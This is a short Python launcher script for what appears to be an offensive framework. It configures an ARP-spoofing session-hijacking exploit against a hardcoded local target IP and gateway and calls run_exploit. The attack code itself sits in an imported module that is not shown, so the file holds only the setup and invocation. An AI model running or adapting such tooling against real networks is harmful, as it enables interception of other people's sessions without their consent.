from core import CoreFramework
import os
import time
import logging

def main():
    # Define the path to the protocols/modules directory
    current_dir = os.path.dirname(os.path.abspath(__file__))
    protocols_path = os.path.join(current_dir, '../protocols')

    # Initialize the Core Framework
    core = CoreFramework(protocols_path)

    # Load protocol modules
    core.load_protocol_modules()

    # Load vulnerability database
    # Already loaded in CoreFramework initialization

    # Define the target vulnerability
    vulnerability = {
        'type': 'session_hijacking',
        'description': 'Exploits ARP spoofing to hijack sessions.',
        'target_session': {
            'target_ip': '192.168.1.10',
            'target_mac': 'AA:BB:CC:DD:EE:FF',
            'gateway_ip': '192.168.1.1',
            'gateway_mac': '11:22:33:44:55:66'
        },
        'max_packets': 100
    }

    # Run Session Hijacking exploit
    core.run_exploit('session_hijacking', vulnerability)

if __name__ == "__main__":
    # Configure logging to display debug information
    logging.basicConfig(
        level=logging.DEBUG,
        format='[%(asctime)s] %(levelname)s - %(name)s - %(message)s',
        handlers=[
            logging.StreamHandler()
        ]
    )
    main()
